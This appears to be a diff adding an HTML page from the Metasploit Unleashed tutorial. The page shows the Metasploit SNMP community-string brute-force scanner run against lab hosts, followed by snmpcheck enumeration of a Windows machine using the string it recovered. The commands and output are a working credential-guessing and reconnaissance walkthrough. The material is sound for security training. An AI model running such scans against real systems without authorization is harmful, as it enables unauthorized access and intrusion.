@@ -1,0 +1,36 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>auxiliary/scanner/snmp/community</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">auxiliary/scanner/snmp/community</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">SNMP is an often-overlooked protocol
+that can provide a wealth of
+information about a networked device. Frequently however, you need to
+know the community string of a device in order to pull the information
+from it. Metasploit has a module that will take a list of community
+strings and brute-force the target to determine the right one.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf &gt; use auxiliary/scanner/snmp/community<br>msf auxiliary(community) &gt; show options<br><br>Module options:<br><br>   Name         Current Setting                                Required  Description<br>   ----         ---------------                                --------  -----------<br>   BATCHSIZE    256                                            yes       The number of hosts to probe in each set<br>   CHOST                                                       no        The local client address<br>   COMMUNITIES  /opt/metasploit3/msf3/data/wordlists/snmp.txt  no        The list of communities that should be attempted per host<br>   RHOSTS                                                      yes       The target address range or CIDR identifier<br>   RPORT        161                                            yes       The target port<br>   THREADS      1                                              yes       The number of concurrent threads<br><br>msf auxiliary(community) &gt; set RHOSTS 192.168.1.2 192.168.1.161<br>RHOSTS =&gt; 192.168.1.2 192.168.1.161<br>msf auxiliary(community) &gt; set THREADS 2<br>THREADS =&gt; 2<br>msf auxiliary(community) &gt; run<br><br>[*] &gt;&gt; progress (192.168.1.2-192.168.1.161) 0/240...<br>[*] 192.168.1.2 'public' 'GSM7224 L2 Managed Gigabit Switch'<br>[*] 192.168.1.2 'private' 'GSM7224 L2 Managed Gigabit Switch'<br>[*] 192.168.1.161 's3cr3t' 'Hardware: x86 Family 6 Model 23 Stepping 7 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)'<br>[*] 192.168.1.161 's00pers3cr3t' 'Hardware: x86 Family 6 Model 23 Stepping 7 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)'<br>[*] Scanned 2 of 2 hosts (100% complete)<br>[*] Auxiliary module execution completed<br>msf auxiliary(community) &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Now that Metasploit has found the
+community string for us, we can
+pass it to an external tool like snmpcheck in BackTrack to query the
+device for us.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">root@dook-bt4:/pentest/enumeration/snmpcheck# ./snmpcheck.pl -t 192.168.1.161 -c s00pers3cr3t<br>snmpcheck.pl v1.7 - snmp enumerator<br>Copyright (c) 2005-2008 by Matteo Cantoni (nothink.org)<br><br> [*] try to connect to 192.168.1.161...<br> [x] Connected to 192.168.1.161! Starting check at Wed Sep  8 19:58:31 2010<br><br> Hostname        : XEN-XP-SP2-BARE<br> Description     : Hardware: x86 Family 6 Model 23 Stepping 7 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)<br> Uptime (snmpd)  : 17 days, 11:44:45.10<br> Domain          : HOTZONE<br> Motd            : -<br><br> [*] Hardware and storage informations<br> -----------------------------------------------------------------------------------------------<br><br> C:\ Label:  Serial Number d0ac18fd<br>    Device type     : FixedDisk<br>    Filesystem type : NTFS<br>    Device units    : 4096<br>    Memory size     : 10.0G<br>    Memory used     : 4.4G<br>    Memory free     : 5.7G<br>...snip...</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/SNMP_Scanners"
+ title="SNMP Scanners">SNMP Scanners</a></div>
+</body>
+</html>
